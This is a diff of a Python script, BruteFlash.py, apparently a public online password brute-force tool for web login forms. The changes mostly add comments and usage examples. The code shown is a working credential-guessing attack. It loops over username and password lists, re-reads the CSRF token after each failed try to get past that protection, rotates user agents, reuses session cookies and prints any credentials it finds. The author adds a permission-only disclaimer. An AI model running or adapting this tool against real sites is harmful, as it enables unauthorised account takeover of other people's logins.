@@ -1,3 +1,18 @@
+"""
+Coded By Alexis Pondo
+Github: http://github.com/alexispondo/
+Linkedin: https://www.linkedin.com/in/alexis-pondo/
+Note: Use this tool on websites that you own or with the permission of the website owner, I am in no way responsible for anything you do with it.
+Usage:
+- For Simple login page (without csrf token)
+$  python3 BruteFlash.py -u http://127.0.0.1/Web/con.php -l user -P passwords.txt --user username --passw passw --submit submit -e "Désolé" -v
+
+- For Secure login page (with csrf token)
+$ python3 BruteFlash.py -u http://127.0.0.1:8000/admin/ -l admin -P passwords.txt --user username --passw passw --submit Login --csrf csrfmiddlewaretoken -e "Username and/or password incorrect." -v
+
+- For Secure login page (with csrf token & Cookies)
+$ python3 BruteFlash.py -u  http://127.0.0.1:8000/admin2/ -l admin2 -P passwords.txt --user username --passw passw --submit Login --csrf csrfmiddlewaretoken -e "Username and/or password incorrect." -C "security: high, PHPSESSID: nbkttnti5kikvru5a4etei6oq8" -v
+"""
 import argparse
 import sys
 from datetime import datetime
@@ -24,7 +39,7 @@ White = "\u001b[37m"
 Reset = "\u001b[0m"
 Underline = "\u001b[4m"
 Flashing = "\033[5m"
-"\033[5mTitle of the Program\033[0m"
+#"\033[5mTitle of the Program\033[0m"
 ###################################################################
 
 
@@ -74,80 +89,83 @@ def get_encoding(file):
 # Convert file to list
 def file_to_list(file):
     try:
-        encoding = get_encoding(file)
-        with open(file, "r", encoding=encoding, errors="ignore") as line:
-            lines = [i.split("\n")[0] for i in line.readlines()]
-        return lines
+        encoding = get_encoding(file) # We get encoding of file
+        with open(file, "r", encoding=encoding, errors="ignore") as line: # We open file with encoding
+            lines = [i.split("\n")[0] for i in line.readlines()] # add all line of file in the list call lines
+        return lines # return list
     except Exception as e:
-        exit_err(str(e))
+        exit_err(str(e)) # if error return it
 ###################################################################
 
 # Create logins list
 def list_of_login(login_data):
     try:
-        if login_data[0] == "log_val":
-            return [login_data[1]]
+        if login_data[0] == "log_val": # if we have entered -l for login value
+            return [login_data[1]] # convert this value un list with one object
         else:
-            return file_to_list(login_data[1])
+            return file_to_list(login_data[1]) # else (we have entered -L) we convert file to list
     except Exception as e:
-        exit_err(str(e))
+        exit_err(str(e)) # if error return it
 ###################################################################
 
 # Create passwords list
 def list_of_password(password_data):
     try:
-        if password_data[0] == "pass_val":
-            return [password_data[1]]
+        if password_data[0] == "pass_val": # if we have entered -p for password value value
+            return [password_data[1]]  # convert this value un list with one object
         else:
-            return file_to_list(password_data[1])
+            return file_to_list(password_data[1]) # else (we have entered -P) we convert file to list
     except Exception as e:
-        exit_err(str(e))
+        exit_err(str(e)) # if error return it
 ###################################################################
 
+# Search csrf value in text returned
 def search_value_csrf(text, csrf):
-    s = Soup(text, "html.parser")
-    csrf_token = s.findAll(attrs={"name": csrf})[0].get('value')
+    s = Soup(text, "html.parser") # we get html text
+    csrf_token = s.findAll(attrs={"name": csrf})[0].get('value') # we search csrf name and return his value
     return csrf_token
-
+###################################################################
 
 
 
 # Global brutforce function
 def brute_force(url, method, login_data:list, password_data:list, input_user, input_pass, input_csrf, input_submit, error_return, cookies, verbose):
-    global csrf_value, found
-    found = False
+    global csrf_value, found # Glabal variable
+    found = False # We initialize found at false
 
-
+    # Brute force fonction with csrf, and method POST
     def attaque_post_csrf(url, l, p, session: Session, cookies):
-        global csrf_value, found
-        payload = {
-            input_user: l,
-            input_pass: p,
-            input_submit: "Connexion",
-            input_csrf: csrf_value
+        global csrf_value, found # Global variable
+        payload = { # payloads
+            input_user: l, # input name of username
+            input_pass: p, # input name of password
+            input_submit: "Connexion", # input name of submit
+            input_csrf: csrf_value # input name of csrf
         }
 
-        ok = "no"
-        j = 0
+        ok = "no" # We initialize ok at no
+        j = 0 # We initialize j at 0
         while ok == "no":
-            j = j + 1
-            try:
-                with session.post(url=url, data=payload, cookies=cookies, headers=header) as rep:
-                    if error_return not in rep.text:
-                        found = True
+            j = j + 1 # we add one at j
+            try: # Try to connect
+                with session.post(url=url, data=payload, cookies=cookies, headers=header) as rep: # we use session to send request to try to connect
+                    if error_return not in rep.text: # if we are connected
+                        found = True # found begin true
                         print(Cyan+Flashing+"*************************** Found !!!! ***************************"+Reset)
-                        print(Cyan+Flashing+"*"+Reset+Green+"\tUsername: {}".format(str(l))+"".center(66)+Reset)
-                        print(Cyan+Flashing+"*"+Reset+Green+"\tPassword: {}".format(str(p))+"".center(66)+Reset)
+                        print(Cyan+Flashing+"*"+Reset+Green+"\tUsername: {}".format(str(l))+"".center(66)+Reset) # print username
+                        print(Cyan+Flashing+"*"+Reset+Green+"\tPassword: {}".format(str(p))+"".center(66)+Reset) # print password
                         print(Cyan+Flashing+"******************************************************************"+Reset)
-                    else:
-                        csrf_value = search_value_csrf(rep.text, input_csrf)
-                    ok = "yes"
-            except Exception as e:
-                print("try again")
-            if j == 4:
+                    else: # else
+                        csrf_value = search_value_csrf(rep.text, input_csrf) # we search csrf value
+                    ok = "yes" # ok begin "yes
+            except Exception as e: # if we can't connect
+                print("try again") # we try again
+            if j == 4: # we stop at 4
                 print("can not use it")
                 ok = "yes"
+    ###################################################################
 
+    # Brute force fonction without csrf, and method POST
     def attaque_post_nocsrf(url, l, p, session: Session, cookies):
         global csrf_value, found
         payload = {
@@ -174,7 +192,9 @@ def brute_force(url, method, login_data:list, password_data:list, input_user, in
             if j == 4:
                 print("can not use it")
                 ok = "yes"
+    ###################################################################
 
+    # Brute force fonction with csrf, and method GET
     def attaque_get_csrf(url, l, p, session: Session, cookies):
         global csrf_value, found
         payload = {
@@ -204,7 +224,9 @@ def brute_force(url, method, login_data:list, password_data:list, input_user, in
             if j == 4:
                 print("can not use it")
                 ok = "yes"
+    ###################################################################
 
+    # Brute force fonction without csrf, and method GET
     def attaque_get_nocsrf(url, l, p, session: Session, cookies):
         global csrf_value, found
         payload = {
@@ -231,55 +253,56 @@ def brute_force(url, method, login_data:list, password_data:list, input_user, in
             if j == 4:
                 print("can not use it")
                 ok = "yes"
+    ###################################################################
 
-    session = requests.session()
-    header = {'User-Agent': random.choice(User_Agent)}
+    session = requests.session() # We initialize our session
+    header = {'User-Agent': random.choice(User_Agent)} # We use one user-agent
 
-    if cookies == None:
-        cookies = requests.utils.cookiejar_from_dict(requests.utils.dict_from_cookiejar(session.cookies))
+    if cookies == None: # if we have note entered -C
+        cookies = requests.utils.cookiejar_from_dict(requests.utils.dict_from_cookiejar(session.cookies)) # We search cookie
     try:
-        r0 = session.get(url, cookies=cookies)
+        r0 = session.get(url, cookies=cookies) # we send our first request
     except Exception as e:
-        exit_err(str(e))
+        exit_err(str(e)) # if error we return it
 
-    if input_csrf != None:
+    if input_csrf != None: # if we have entered --csrf
         try:
-            csrf_value = search_value_csrf(r0.text, input_csrf)
-        except IndexError:
+            csrf_value = search_value_csrf(r0.text, input_csrf) # we search csrf value
+        except IndexError: # we return error
             exit_err("[!] Error --csrf : Please check if your csrf token name is correct or if your login page use csrf token protection")
 
-        list_log = list_of_login(login_data)
-        list_pass = list_of_password(password_data)
-        k = 0
-        for p in list_pass:
-            for l in list_log:
-                k += 1
-                if verbose:
-                    print(Yellow + "Attempt " + str(k) + "- Login: " + l + " Password: " + p + Reset)
-                if method == "POST":
+        list_log = list_of_login(login_data) # we get list of login
+        list_pass = list_of_password(password_data) # we get list of password
+        k = 0 # We initialize k at 0
+        for p in list_pass: # for each password
+            for l in list_log: # For each username
+                k += 1 # we add 1 at k
+                if verbose: # if we have entered -v
+                    print(Yellow + "Attempt " + str(k) + "- Login: " + l + " Password: " + p + Reset) # we print attempt
+                if method == "POST": # if we used POST method, we send attaque with thread
                     #attaque_post_csrf(url, l, p, session, cookies)
                     t = Thread(target=attaque_post_csrf, args=(url, l, p, session, cookies,))
                     t.start()
                     t.join()
-                else:
+                else: # if we used GET method, we send attaque with thread
                     #attaque_get_csrf(url, l, p, session, cookies)
                     t = Thread(target=attaque_get_csrf, args=(url, l, p, session, cookies,))
                     t.start()
                     t.join()
-                if found:
-                    if k == 1:
+                if found: # if corrects credentials is founded
+                    if k == 1: # if correct credentials is attempt 1, it can maybe error
                         print(Magenta+""""Warning!!!: 
 this may be a fake, if it is the case it is probably that the following parameters are not correct:
 -u, --user, --passw, --submit, --csrf, -e or -C if you are used cookie 
 Please change them and use the correct information""")
                         sys.exit("Exit..." + Reset)
-                    ending = str(datetime.now()).split(".")[0]
+                    ending = str(datetime.now()).split(".")[0] # print ending
                     print("""====================================================================================
 """ + ending + """ Ending BruteForcing
 ====================================================================================
 """)
                     sys.exit(Blue+"Exit..."+Reset)
-    else:
+    else: # if we have not entered --csrf
         list_log = list_of_login(login_data)
         list_pass = list_of_password(password_data)
         k = 0
@@ -311,11 +334,26 @@ Please change them and use the correct information""")
 ====================================================================================
 """)
                     sys.exit(Blue+"Exit..."+Reset)
+    ending = str(datetime.now()).split(".")[0]
+    print("""====================================================================================
+"""+Red+""")-: Correct credentials not found :-("""+Reset+"""
+""" + ending + """ Ending BruteForcing
+====================================================================================
+""")
 ###################################################################
 
 
 # Parser
-parser = argparse.ArgumentParser(description="Brute Fore online tool")
+parser = argparse.ArgumentParser(usage= """
+- For Simple login page (without csrf token)
+$ python3 BruteFlash.py -u http://127.0.0.1/Web/con.php -l user -P passwords.txt --user username --passw passw --submit submit -e "Désolé" -v
+
+- For Secure login page (with csrf token)
+$ python3 BruteFlash.py -u http://127.0.0.1:8000/admin/ -l admin -P passwords.txt --user username --passw passw --submit Login --csrf csrfmiddlewaretoken -e "Username and/or password incorrect." -v
+
+- For Secure login page (with csrf token & Cookies)
+$ python3 BruteFlash.py -u  http://127.0.0.1:8000/admin2/ -l admin2 -P passwords.txt --user username --passw passw --submit Login --csrf csrfmiddlewaretoken -e "Username and/or password incorrect." -C "security: high, PHPSESSID: nbkttnti5kikvru5a4etei6oq8" -v\n """,
+    description="Online bruteforce tool")
 
 
 parser.add_argument("-u", type=str, required=True, help="Login URL")
@@ -342,12 +380,12 @@ args = parser.parse_args()
 # Check url and return correct url or error
 def get_url(url, cookies):
     try:
-        with requests.session().get(url, cookies=cookies) as response:
+        with requests.session().get(url, cookies=cookies) as response: # we send get request
             result = response.status_code
-        if result not in range(200,300):
+        if result not in range(200,300): # we check if status code is success
             exit_err("[!] Error -u: "+url+" not found")
 
-        if str(response.url) != url:
+        if str(response.url) != url: # if we have redirected
             exit_err("[!] Error -u: Your url "+url+" is redirected at "+str(response.url)+"\nPlease Enter correct url. If this is not the problem, you should may be entered cookies to confirm that you are authorized")
         return url
     except Exception as e:
@@ -368,16 +406,16 @@ def get_method(method):
 
 # get login
 def get_login(login_value, LOGIN_FILE):
-    if login_value == None and LOGIN_FILE == None:
+    if login_value == None and LOGIN_FILE == None: # if we have not entered login data
         exit_err("[!] Error login: -l or -L are required")
-    elif login_value != None and LOGIN_FILE != None:
+    elif login_value != None and LOGIN_FILE != None: # if have entered -l and -L
         exit_err("[!] Error login: Only one of -l or -L is required, not the both in the same time")
     else:
         if login_value != None:
-            return ["log_val", str(login_value)]
+            return ["log_val", str(login_value)] # we return key "log_val" and login value
         elif LOGIN_FILE != None:
             if Path(LOGIN_FILE).is_file():
-                return ["log_file", os.path.abspath(str(LOGIN_FILE))]
+                return ["log_file", os.path.abspath(str(LOGIN_FILE))] # we return key "log file" and full path of login file
             else:
                 exit_err("[!] Error -L: Login path file not found")
 ###################################################################
@@ -403,7 +441,7 @@ def get_cookie(cookie):
     if cookie == None:
         return None
     else:
-        try:
+        try: # we convert cookie form in dictionary
             cookie = str(cookie).split(",")
             dic = {}
             for c in cookie:
@@ -417,19 +455,19 @@ def get_cookie(cookie):
 
 # Main program
 def main():
-    print(Yellow+banner()+Reset)
+    print(Yellow+banner()+Reset) # print banner
 
-    url = get_url(args.u, get_cookie(args.C))
-    login_data = get_login(args.l, args.L)
-    password_data =get_password(args.p, args.P)
-    method = get_method(args.m)
-    user = args.user
-    passw = args.passw
-    submit = args.submit
-    csrf = args.csrf
-    error_returned = args.e
-    cookies = get_cookie(args.C)
-    verbose = args.v
+    url = get_url(args.u, get_cookie(args.C)) # get correct url
+    login_data = get_login(args.l, args.L) # get login data
+    password_data =get_password(args.p, args.P) # get password data
+    method = get_method(args.m) # get method
+    user = args.user # get input name of username
+    passw = args.passw # get input name of password
+    submit = args.submit # get input name of submit
+    csrf = args.csrf # get input name of csrf token
+    error_returned = args.e # get error returned
+    cookies = get_cookie(args.C) # get cookie
+    verbose = args.v # get verbose ?
 
     print("""
 ====================================================================================
@@ -451,7 +489,7 @@ def main():
 """+starting+""" Starting BruteForcing...
 ====================================================================================
 """)
-    try:
+    try: # launch attack
         brute_force(url=url,method=method,login_data=login_data,password_data=password_data,input_user=user,
                 input_pass=passw, input_submit=submit,input_csrf=csrf,error_return=error_returned, cookies=cookies, verbose=verbose)
     except KeyboardInterrupt as e:
